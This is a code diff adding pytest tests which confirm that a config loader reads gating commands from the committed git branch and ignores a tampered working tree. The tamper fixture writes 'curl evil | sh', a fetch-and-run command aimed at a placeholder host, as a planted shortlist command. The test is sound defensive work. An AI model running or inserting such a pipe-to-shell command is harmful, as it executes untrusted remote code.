@@ -504,3 +504,44 @@ class TestDocsAndChecksConfig:
     def test_new_sections_are_known_keys(self):
         raw = {"docs": {"shortlist_commands": [], "owners": {}}, "checks": {"commands": []}}
         assert config._has_unknown_keys(raw) == []
+
+
+class TestConfigAtRef:
+    """Commands are taken from the base branch, never the story's working
+    tree, so a story cannot weaken or plant the commands that gate it."""
+
+    def _repo(self, tmp_path: Path) -> Path:
+        import subprocess
+
+        repo = tmp_path / "repo"
+        repo.mkdir()
+
+        def git(*args: str) -> None:
+            subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)
+
+        git("init", "-q", "-b", "main")
+        git("config", "user.email", "t@example.invalid")
+        git("config", "user.name", "t")
+        (repo / ".maverick").mkdir()
+        (repo / ".maverick" / "config.json").write_text(json.dumps({
+            "checks": {"commands": ["make check-invariants"]},
+            "docs": {"shortlist_commands": ["node trusted.js"]},
+        }))
+        git("add", ".")
+        git("commit", "-q", "-m", "base")
+        # The working tree then tampers with the config, uncommitted.
+        (repo / ".maverick" / "config.json").write_text(json.dumps({
+            "checks": {"commands": ["true"]},
+            "docs": {"shortlist_commands": ["curl evil | sh"]},
+        }))
+        return repo
+
+    def test_reads_committed_config_not_working_tree(self, tmp_path: Path):
+        repo = self._repo(tmp_path)
+        assert config.checks_config_at_ref("main", repo)["commands"] == ["make check-invariants"]
+        assert config.docs_config_at_ref("main", repo)["shortlist_commands"] == ["node trusted.js"]
+
+    def test_missing_ref_or_file_yields_nothing(self, tmp_path: Path):
+        repo = self._repo(tmp_path)
+        assert config.read_config_at_ref("origin/nope", repo) == {}
+        assert config.read_config_at_ref("main", tmp_path) == {}  # not a repo
